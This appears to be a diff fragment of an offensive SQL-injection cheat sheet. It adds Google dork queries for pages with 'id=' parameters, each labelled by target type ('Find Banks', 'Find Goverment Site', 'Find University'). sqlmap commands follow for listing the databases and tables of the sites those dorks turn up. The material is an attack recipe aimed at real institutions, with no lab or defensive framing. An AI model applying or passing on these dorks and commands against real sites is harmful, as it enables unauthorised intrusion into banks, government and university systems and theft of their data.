@@ -28,6 +28,9 @@ inurl:"branches.php?id="        Find Banks
 inurl:"/sin/news.php?id="       Find Goverment Site
 inurl:"pay_slip.php?member_id=" Find University
 inurl:"displaymember.php?id="   Find University
+inurl:"branches.php?id="        Find Goverment Site
+inurl:"detalle.php?id=" 	Find University
+
 sqlmap -u URL --dbs
 
 sqlmap -u URL -D @@ --tables
